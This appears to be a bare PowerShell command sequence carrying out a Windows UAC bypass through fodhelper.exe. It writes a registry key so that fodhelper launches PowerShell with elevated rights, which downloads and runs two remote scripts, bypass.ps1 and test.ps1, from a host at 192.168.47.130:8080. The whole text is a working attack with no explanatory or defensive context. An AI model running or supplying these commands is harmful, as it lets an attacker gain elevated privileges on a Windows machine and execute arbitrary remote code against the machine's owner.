New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe "iex (new-object net.webclient).downloadstring('http://192.168.47.130:8080/bypass.ps1'); iex (new-object net.webclient).downloadstring('http://192.168.47.130:8080/test.ps1')" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
